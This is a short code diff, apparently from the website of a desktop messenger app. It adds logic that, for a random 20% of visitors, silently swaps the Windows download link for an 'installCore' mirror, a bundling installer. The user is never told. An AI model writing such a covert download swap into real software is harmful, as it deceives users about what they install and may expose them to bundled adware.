@@ -23,4 +23,8 @@
 
   linkOSX.setAttribute 'target', '_blank'
   linkWin.setAttribute 'target', '_blank'
+
+  if (Math.random() < 0.2)
+    linkWin.setAttribute 'href', 'https://updates.messengerfordesktop.com/download/mirror/installcore/latest?platform=win32'
+    linkWin.setAttribute 'galabel', 'installCore'
 )()
